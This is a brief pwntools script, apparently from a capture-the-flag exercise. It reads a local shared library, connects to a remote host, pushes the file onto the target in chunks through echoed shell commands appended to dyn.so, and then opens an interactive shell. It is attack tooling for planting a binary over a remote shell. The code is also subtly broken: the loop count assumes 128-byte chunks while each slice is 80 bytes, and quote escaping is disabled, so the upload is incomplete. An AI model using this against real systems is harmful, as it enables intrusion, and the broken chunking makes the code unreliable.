from pwn import *
context.log_level='debug'

if __name__ == '__main__':
    with open('./libdynelf.so', 'rb') as f:
        content = f.read()
    # content_cp = b''
    # for byte in content:
    #     if byte != '"':
    #         content_cp += p8(byte)
    #     else:
    #         content_cp += '\\"'
    # content = content_cp
    io = remote('nep.lemonprefect.cn', 21731)
    for i in range(len(content) // 0x80):
        io.send(b'echo -n "' + content[i*80:(i+1)*80] + b'" >> dyn.so\n')
        print(i*80/1024)
    io.interactive()